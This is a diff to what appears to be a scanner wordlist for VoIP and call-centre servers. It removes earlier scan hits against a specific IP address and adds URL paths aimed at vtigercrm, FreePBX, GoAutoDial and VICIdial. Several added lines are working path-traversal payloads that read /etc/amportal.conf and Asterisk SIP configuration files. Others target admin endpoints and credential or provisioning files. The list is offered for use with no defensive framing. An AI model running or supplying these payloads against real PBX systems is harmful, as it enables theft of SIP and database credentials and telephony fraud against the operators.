@@ -1,10 +1,18 @@
-
-    200 [] https://64.85.47.7/Utilities/configuration/phoneBackup
-    200 [] https://64.85.47.7/Utilities/configuration/exportFile?source=7
-    
-    
-    # VoIP scan
-
+Utilities/configuration/phoneBackup
+Utilities/configuration/exportFile?source=7
+vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//etc/asterisk/sip_additional.conf
+vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//etc/amportal.conf
+vtigercrm/graph.php?module=../../../../../../../../../etc/amportal.conf
+vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&module=Accounts&action
+modules/extensions_batch/libs/download_csv.php
+vtigercrm/graph.php?current_language=../../../../../../../..//etc//asterisk/sip_additional.conf&module=Accounts&action
+admin/modules/framework/bin/generate_hints.php
+admin/modules/framework/bin/gen_amp_conf.php
+goautodial-admin/admin.php?ADD=341111111111&carrier_id=Packet8
+vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//etc/asterisk/sip-vicidial.conf
+vicidial/project_auth_entries.txt
+vicidial/admin.php?ADD=140000000000
+DB_SIPSTA600.str?DBNAME=DB_SIPSTA
 000000000000.cfg
 000000000000-registration.cfg
 000000000000-user.cfg
